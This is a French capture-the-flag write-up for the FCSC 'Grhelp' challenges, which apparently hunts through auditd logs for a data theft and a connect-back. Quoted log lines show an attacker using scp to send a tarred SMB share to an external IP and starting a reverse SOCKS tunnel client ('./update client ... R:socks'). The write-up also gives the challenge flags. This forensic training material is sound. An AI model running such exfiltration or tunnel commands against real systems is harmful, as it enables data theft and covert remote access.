# Grhelp - Exfiltration

L'archive contient des logs auditd (format Wazuh) de la machine backupfiler.jurisdefense.intra, couvrant toute la journée du 14 mai 2025.

En cherchant les outils de transfert réseau dans les logs (scp, curl, wget, nc…), un événement SCP ressort sur backupfiler :

```bash
$ grep -r "backupfiler" ./logs/* | grep -Ew 'nc|curl|scp|wget' | grep "type=EXECVE"
./logs/linux/linux-logs.jurisdefense.intra_20250514T024001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747190222.258:335101): argc=3 a0="dpkg" a1="-l" a2="wget"
./logs/linux/linux-logs.jurisdefense.intra_20250514T024001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747190222.258:335105): argc=4 a0="dpkg-query" a1="--list" a2="--" a3="wget"
./logs/linux/linux-logs.jurisdefense.intra_20250514T024001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747190222.578:335128): argc=8 a0="wget" a1="--timeout" a2="60" a3="-U" a4=776765742F312E32312E322D327562756E7475312E31205562756E74752F32322E30342E352F4C545320474E552F4C696E75782F362E352E302D313032352D617A7572652F7838365F363420496E74656C2852292F58656F6E2852292F506C6174696E756D2F38323732434C2F4350552F402F322E363047487A20636C6F75645F69642F617A757265 a5="-O-" a6="--content-on-error" a7="https://motd.ubuntu.com"
./logs/linux/linux-logs.jurisdefense.intra_20250514T091001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213691.971:338148): argc=4 a0="scp" a1="/tmp/smb_share.tar.gz" a2="15.188.57.187"
./logs/linux/linux-logs.jurisdefense.intra_20250514T143501_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747233078.466:341266): argc=3 a0="scp" a1="-f" a2="/home/goadmin/update"
./logs/linux/linux-logs.jurisdefense.intra_20250514T130501_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747227668.072:340256): argc=3 a0="dpkg" a1="-l" a2="wget"
./logs/linux/linux-logs.jurisdefense.intra_20250514T130501_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747227668.072:340260): argc=4 a0="dpkg-query" a1="--list" a2="--" a3="wget"
./logs/linux/linux-logs.jurisdefense.intra_20250514T130501_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747227668.660:340283): argc=8 a0="wget" a1="--timeout" a2="60" a3="-U" a4=776765742F312E32312E322D327562756E7475312E31205562756E74752F32322E30342E352F4C545320474E552F4C696E75782F362E352E302D313032352D617A7572652F7838365F363420496E74656C2852292F58656F6E2852292F506C6174696E756D2F38323732434C2F4350552F402F322E363047487A20636C6F75645F69642F617A757265 a5="-O-" a6="--content-on-error" a7="https://motd.ubuntu.com"
```

## SCP (l'événement clé) :

```
audit(1747213691.971:338148)
EXECVE: scp /tmp/smb_share.tar.gz 15.188.57.187
```

## Chronologie de l'exfiltration

```bash
$  grep -r "backupfiler" ./logs/* | grep "type=EXECVE" | grep "smb_share.tar.gz"
./logs/linux/linux-logs.jurisdefense.intra_20250514T091001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213513.472:338023): argc=4 a0="tar" a1="cvzf" a2="smb_share.tar.gz" a3="/smb_share"
./logs/linux/linux-logs.jurisdefense.intra_20250514T091001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213691.971:338148): argc=4 a0="scp" a1="/tmp/smb_share.tar.gz" a2="15.188.57.187"
./logs/linux/linux-logs.jurisdefense.intra_20250514T091001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747213701.323:338151): argc=2 a0="rm" a1="smb_share.tar.gz"
```

## Réponses

| Élément | Valeur |
| ------- | ------ |
| Outils d'exfiltration | scp |
| Chemin absolu du fichier | /tmp/smb_share.tar.gz|
| Heure de préparation | (UTC)2025-05-14T09:05:13|

## Flag

```
FCSC{scp-/tmp/smb_share.tar.gz-2025-05-14T09:05:13}
```

# Grhelp - Connect back

## Comprendre le format auditd
Les logs auditd enregistrent les appels système. Les entrées clés sont :

* `type=EXECVE` : arguments d'une commande exécutée
* `type=SYSCALL` : l'appel système associé (execve = exécution de processus)

auditd encode en hexadécimal les arguments contenant des espaces ou caractères spéciaux

## Résolution

En cherchant les outils de connexion et revershell (`/dev/tcp`, `bash -i'`, `nc`, `connect`, `socket`), aucun événement intéressant n'est ressortis. Même résultat avec les commandes encodé en hex.

(Dans un étant de fatigue j'ai décidé de résoudre ce challenge de manière bête et méchante). 

Ensuite j'ai recherché toutes les adresses IP présentes dans les logs afin d’avoir une vision globale des interactions réseau enregistrées.

```bash
$ grep -rwE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ./logs/
```

Après avoir obtention du résultat, j’ai remarqué que certaines IPs apparaissaient plusieur fois mais semblaient non pertinentes pour l’analyse. j'ai donc affiner la recherche en excluant ces éléments :

```bash
$ grep -rwE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" ./logs/ | grep -Ev "2.13.1.1|192.168|168.63.129.16"
./logs/linux-logs.jurisdefense.intra_20250513T133001_linux_auditd.log:node=backupfiler.jurisdefense.intra type=EXECVE msg=audit(1747142884.895:330846): argc=4 a0="./update" a1="client" a2="15.188.57.187:9999" a3="R:socks"
```

| Question | Réponse |
| -------- | ------- |
| Commande exécutée | ./update client 15.188.57.187:9999 R:socks |
| Machine compromise | backupfiler |

### Flag

```
FCSC{backupfiler-./update client 15.188.57.187:9999 R:socks}
```